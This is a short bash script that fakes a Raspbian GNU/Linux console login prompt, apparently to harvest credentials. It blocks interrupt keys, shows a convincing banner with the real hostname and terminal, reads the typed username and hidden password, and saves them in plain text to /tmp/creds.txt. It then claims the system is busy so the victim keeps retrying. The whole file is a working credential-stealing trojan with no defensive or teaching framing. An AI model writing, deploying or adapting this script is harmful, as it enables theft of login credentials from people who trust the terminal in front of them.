#!/bin/bash

h=`hostname`
t=`tty`

stty -isig

while true
do
  clear
  echo "Raspbian GNU/Linux 10 $h $t"
  echo
  read -p "$h login: " u
  read -sp "Password: " p

  echo "$u $p" > /tmp/creds.txt

  echo
  sleep 5
  echo "System busy. Please try later."
  sleep 5
done
